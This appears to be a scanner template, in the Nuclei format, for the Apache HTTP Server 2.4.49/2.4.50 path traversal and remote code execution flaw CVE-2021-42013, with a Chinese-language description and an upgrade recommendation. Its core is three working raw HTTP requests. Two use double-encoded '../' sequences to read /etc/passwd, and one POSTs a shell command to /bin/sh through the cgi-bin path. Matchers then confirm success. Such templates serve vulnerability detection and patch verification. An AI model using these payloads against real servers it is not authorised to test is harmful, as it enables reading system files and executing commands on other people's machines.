id: CVE-2021-42013

info:
  name: Apache 2.4.49/2.4.50 - 目录遍历和远程代码执行(CVE-2021-42013)
  author: wintry
  severity: critical
  description: |
    在Apache HTTP Server 2.4.49和2.4.50中对路径规范化所做的更改中发现了一个缺陷.
    攻击者可以使用路径遍历攻击将url映射到预期文档根目录之外的文件.
    如果文档根目录之外的文件没有被"require all denied"保护,这些请求可以成功.
    此外,此漏洞可能泄露诸如CGI脚本之类的解释文件的源.
    在某些配置中,例如,如果启用了mod_cgi,则此缺陷可能导致远程代码执行.
    此问题仅影响Apache 2.4.49和2.4.50,而不影响更早的版本.
    CVE-2021-42013是由于原始漏洞CVE-2021-41773的不完整修复.
  remediation: Upgrade to Apache HTTP Server 2.4.51 or later.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-42013
    cwe-id: CWE-22
    epss-score: 0.97546
  metadata:
    max-request: 3
    verified: "true"
  tags: apache2449,apache2450

variables:
  cmd: "echo COP-37714-1202-EVC | rev"

http:
  - raw:
      - |+
        GET /icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

      - |+
        GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

      - |+
        POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}
        Content-Type: application/x-www-form-urlencoded

        echo Content-Type: text/plain; echo; {{cmd}}

    stop-at-first-match: true
    unsafe: true
    matchers-condition: or
    matchers:
      - type: regex
        name: LFI
        regex:
          - "root:.*:0:0:"

      - type: word
        name: RCE
        words:
          - "CVE-2021-42013"
